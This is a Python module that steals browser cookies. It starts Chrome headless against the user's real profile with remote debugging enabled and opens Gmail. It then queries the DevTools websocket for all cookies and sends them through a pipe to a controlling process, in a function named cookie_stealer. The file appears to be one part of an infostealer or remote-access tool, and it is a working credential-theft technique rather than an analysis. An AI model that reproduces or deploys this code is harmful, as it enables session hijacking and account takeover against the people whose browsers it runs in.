import os
import shutil
import signal
import sys
import time

import json
import subprocess
import requests
import websocket

REMOTE_DEBUGGING_PORT = 9222
GET_ALL_COOKIES_REQUEST = json.dumps({"id": 1, "method": "Network.getAllCookies"})

CHROME_CMD = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
USER_DATA_DIR = r"%LOCALAPPDATA%\Google\Chrome\User Data"

CHROME_DEBUGGING_CMD = """\"{chrome}\" --headless --user-data-dir="{user_data_dir}" https://gmail.com --remote-debugging-port=9222""".format(
    chrome=CHROME_CMD,
    user_data_dir=USER_DATA_DIR
)

def summon_forbidden_protocol():
    process = subprocess.Popen(CHROME_DEBUGGING_CMD,
                               shell=True,
                               stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL)

    time.sleep(5)
    
    return process

def hit_that_secret_json_path_like_its_1997():
    response = requests.get("http://localhost:{port}/json".format(port=REMOTE_DEBUGGING_PORT))
    websocket_url = response.json()[0].get("webSocketDebuggerUrl")
    return websocket_url

def gimme_those_cookies(ws_url):
    ws = websocket.create_connection(ws_url)
    ws.send(GET_ALL_COOKIES_REQUEST)
    result = ws.recv()
    ws.close()

    response = json.loads(result)
    cookies = response["result"]["cookies"]

    return cookies

def cleanup(chrome_process):
    os.kill(chrome_process.pid + 1, signal.SIGTERM)
    
def get_cookies():
    forbidden_process = summon_forbidden_protocol()
    secret_websocket_debugging_url = hit_that_secret_json_path_like_its_1997()

    cookies = gimme_those_cookies(secret_websocket_debugging_url)

    # Sleep so we don't get "Killed" in output
    time.sleep(1)

    cleanup(forbidden_process)
    
    cookies = json.dumps(cookies,indent=4, separators=(',', ': '), sort_keys=True)

    return cookies

def cookie_stealer(pipe):
    while True:
        while pipe.poll():
            command = pipe.recv()
            if command == "get_cookies":
                cookies = get_cookies()
                pipe.send(cookies)